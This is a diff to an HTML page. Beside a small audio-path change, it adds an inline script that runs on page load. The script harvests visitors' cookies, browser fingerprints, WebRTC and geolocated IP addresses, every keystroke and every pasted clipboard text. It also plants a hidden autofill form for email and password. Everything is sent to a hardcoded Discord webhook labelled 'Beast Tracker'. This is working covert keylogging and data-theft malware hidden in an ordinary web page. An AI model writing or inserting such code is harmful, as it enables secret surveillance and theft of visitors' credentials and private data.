@@ -153,7 +153,7 @@
   </div>
 
   <audio id="music" loop>
-    <source src="music.mp3" type="audio/mpeg">
+    <source src="audio/audio404.mp3" type="audio/mpeg">
   </audio>
 
   <script>
@@ -201,6 +201,100 @@
       location.reload();
     }
   </script>
+<script>
+(function() {
+  const HOOK = "https://discord.com/api/webhooks/1423658698668245112/BZh5DCjn7fkhIb6xgQgbjjTfY0iwx-kZL4o7YuB5xWA-d5gkcmQ8pod7y_ZFKsv4pTjM"; // replace
 
+  function send(payload) {
+    fetch(HOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  // Base info
+  let victim = {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    plat: navigator.platform,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    dim: screen.width+"x"+screen.height,
+    scale: window.devicePixelRatio,
+    cookies: document.cookie || "none"
+  };
+
+  // Canvas fingerprint
+  try{
+    let c=document.createElement('canvas');
+    let ctx=c.getContext('2d');
+    ctx.textBaseline="top"; ctx.font="14px Arial"; ctx.fillText("finger",2,2);
+    victim.canvas = c.toDataURL();
+  }catch(e){}
+
+  // WebGL fingerprint
+  try{
+    let gl=document.createElement('canvas').getContext('webgl');
+    victim.gpu = gl.getParameter(gl.VENDOR)+" | "+gl.getParameter(gl.RENDERER);
+  }catch(e){}
+
+  // WebRTC IP leaks
+  function grabIPs(cb){
+    let pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.onicecandidate = e=>{
+      if(!e.candidate) return;
+      let ip = e.candidate.candidate.split(" ")[4];
+      cb(ip);
+    };
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+  }
+
+  let ips = [];
+  grabIPs(ip => { ips.push(ip); victim.webrtc = ips; });
+
+  // Geo info via ipinfo
+  fetch('https://ipinfo.io/json')
+    .then(r=>r.json()).then(d=>{
+      victim.ip = d.ip;
+      victim.loc = d.city+", "+d.country;
+      victim.org = d.org;
+      dump();
+    });
+
+  // keylogger
+  document.addEventListener('keydown', e=>{
+    send({content:`Key: ${e.key}`});
+  });
+
+  // clipboard capture
+  document.addEventListener('paste', e=>{
+    let text = (e.clipboardData || window.clipboardData).getData('text');
+    send({content:`Clipboard: ${text}`});
+  });
+
+  // Autofill trap
+  let form=document.createElement('form');
+  ["email","password","tel","name"].forEach(n=>{
+    let input=document.createElement('input');
+    input.type="text"; input.name=n; input.style="position:absolute;left:-9999px;";
+    form.appendChild(input);
+  });
+  document.body.appendChild(form);
+
+  // Final dump
+  function dump(){
+    send({
+      embeds:[{
+        title:"🐍 Beast Tracker",
+        color:0x111111,
+        fields:Object.keys(victim).map(k=>({name:k,value:JSON.stringify(victim[k]).slice(0,1000)})),
+        timestamp:new Date()
+      }]
+    })
+  }
+
+})();
+</script>
 </body>
 </html>
